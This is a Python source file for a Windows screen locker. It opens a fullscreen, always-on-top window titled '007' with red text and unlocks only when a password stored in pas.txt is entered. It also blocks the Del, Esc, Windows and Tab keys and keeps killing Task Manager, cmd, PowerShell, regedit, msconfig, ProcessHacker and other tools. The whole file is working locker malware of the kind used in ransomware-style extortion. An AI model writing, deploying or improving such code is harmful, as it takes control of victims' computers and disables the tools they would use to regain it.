import asyncio
from tkinter import Tk, Entry, Label
from psutil import process_iter
from keyboard import block_key
from label import main_text, second_text


root = Tk()


class Locker:

    def __init__(self):
        self.block = False
        with open(r'pas.txt', 'r') as pas:
            self.data = pas.read()
        root.title("007")
        root.configure(background="#1c1c1c")
        self.entry = Entry(root, show='⮚', font='Arial 15', fg="red")
        self.entry.place(width=350, height=30, relx=0.4, rely=0.5, x=-30)
        label_0 = Label(root, text=main_text, font='Arial 5', fg="red", background="#1c1c1c")
        label_0.grid(row=0, column=0)
        label_1 = Label(root, text=second_text, font='Arial 15', fg='red', background='#1c1c1c')
        label_1.place(relx=0.4, rely=0.5, x=-20, y=40)

    async def close(self):
        root.attributes("-fullscreen", True)
        root.attributes('-topmost', 1)
        root.protocol("WM_DELETE_WINDOW")
        root.update()
        root.bind('<Alt-KeyPress-s>', self.check_password)

    def check_password(self, event):
        if self.entry.get() == self.data:
            self.block = True

    async def block_button(self):
        buttons = ['Del', 'Esc', 'Windows', 'Tab']
        for button in buttons:
            block_key(button)

    async def block_process(self):
        processing = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'powershell_ise.exe', 'regedit.exe', 'msconfig.exe',
                      'ProcessHacker.exe', 'iexplore.exe', 'game.exe', 'SystemSettings.exe']
        for process in process_iter():
            if process.name() in processing:
                process.kill()

    async def main(self):
        coro_list = [self.close(), self.block_button(), self.block_process()]
        cors = []
        for i in coro_list:
            task = asyncio.create_task(i)
            cors.append(task)
            await asyncio.sleep(0.1)

        await asyncio.gather(*cors, return_exceptions=True)


if __name__ == '__main__':
    app = Locker()
    while app.block is not True:
        asyncio.run(app.main())
